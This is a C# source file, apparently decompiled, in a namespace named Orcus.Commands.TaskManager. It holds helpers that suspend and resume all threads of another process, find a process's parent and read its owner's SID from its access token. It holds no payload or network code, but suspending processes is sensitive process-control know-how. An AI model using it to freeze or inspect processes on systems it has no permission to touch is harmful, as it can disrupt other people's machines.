using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Orcus.Native;

namespace Orcus.Commands.TaskManager;

public static class ProcessExtension
{
	private const int TOKEN_QUERY = 8;

	public static void Suspend(this Process process)
	{
		if (process.ProcessName == string.Empty)
		{
			return;
		}
		foreach (ProcessThread thread in process.Threads)
		{
			IntPtr intPtr = NativeMethods.OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, (uint)thread.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				NativeMethods.SuspendThread(intPtr);
				NativeMethods.CloseHandle(intPtr);
			}
		}
	}

	public static void Resume(this Process process)
	{
		if (process.ProcessName == string.Empty)
		{
			return;
		}
		foreach (ProcessThread thread in process.Threads)
		{
			if (thread.ThreadState != ThreadState.Wait || thread.WaitReason != ThreadWaitReason.Suspended)
			{
				continue;
			}
			IntPtr intPtr = NativeMethods.OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, (uint)thread.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				int num;
				do
				{
					num = NativeMethods.ResumeThread(intPtr);
				}
				while (num > 0);
				NativeMethods.CloseHandle(intPtr);
			}
		}
	}

	public static int GetParentProcess(IntPtr handle)
	{
		ProcessBasicInformation processInformation = default(ProcessBasicInformation);
		if (NativeMethods.NtQueryInformationProcess(handle, 0, ref processInformation, Marshal.SizeOf((object)processInformation), out var _) != 0)
		{
			return -1;
		}
		try
		{
			return processInformation.InheritedFromUniqueProcessId.ToInt32();
		}
		catch (ArgumentException)
		{
			return -1;
		}
	}

	public static bool DumpUserInfo(IntPtr pToken, out IntPtr sid)
	{
		int desiredAccess = 8;
		IntPtr TokenHandle = IntPtr.Zero;
		bool result = false;
		sid = IntPtr.Zero;
		try
		{
			if (NativeMethods.OpenProcessToken(pToken, desiredAccess, ref TokenHandle))
			{
				result = ProcessTokenToSid(TokenHandle, out sid);
				NativeMethods.CloseHandle(TokenHandle);
			}
			return result;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static bool ProcessTokenToSid(IntPtr token, out IntPtr sid)
	{
		IntPtr intPtr = Marshal.AllocHGlobal(256);
		sid = IntPtr.Zero;
		try
		{
			int reqLength = 256;
			bool tokenInformation = NativeMethods.GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenUser, intPtr, 256, ref reqLength);
			if (tokenInformation)
			{
				sid = ((TOKEN_USER)Marshal.PtrToStructure(intPtr, typeof(TOKEN_USER))).User.Sid;
			}
			return tokenInformation;
		}
		catch (Exception)
		{
			return false;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string GetProcessOwner(int processId)
	{
		return GetProcessOwner(Process.GetProcessById(processId).Handle);
	}

	public static string GetProcessOwner(IntPtr handle)
	{
		try
		{
			string pStringSid = string.Empty;
			if (DumpUserInfo(handle, out var sid))
			{
				NativeMethods.ConvertSidToStringSid(sid, ref pStringSid);
			}
			return pStringSid;
		}
		catch (Exception)
		{
			return "Unknown";
		}
	}
}
